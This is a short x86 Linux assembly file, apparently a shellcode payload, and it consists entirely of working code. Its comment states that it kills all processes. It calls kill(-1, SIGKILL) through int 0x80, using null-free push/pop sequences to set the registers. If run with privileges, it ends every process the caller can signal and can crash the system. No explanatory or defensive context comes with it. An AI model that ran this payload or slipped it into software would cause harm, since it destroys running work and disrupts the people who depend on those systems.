section .text

global _start

_start:

    ; kill(-1, SIGKILL)

    xor ebx, ebx
    dec ebx
    push byte 37
    pop eax
    push byte 9
    pop ecx
    int 0x80
